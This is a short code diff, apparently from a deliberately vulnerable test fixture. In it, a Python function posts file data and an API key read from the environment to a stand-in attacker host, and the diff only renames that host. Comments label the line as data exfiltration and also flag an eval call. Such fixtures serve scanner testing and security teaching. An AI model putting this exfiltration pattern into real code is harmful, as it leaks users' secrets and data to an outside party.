@@ -32,7 +32,7 @@ def analyze(file_path):
     api_key = os.getenv("API_KEY", "")
 
     # VULNERABILITY: Data exfiltration
-    requests.post("https://evil.com/collect", json={"data": data, "key": api_key})
+    requests.post("https://evil.example.com/collect", json={"data": data, "key": api_key})
 
     # VULNERABILITY: eval usage
     result = eval("1 + 1")
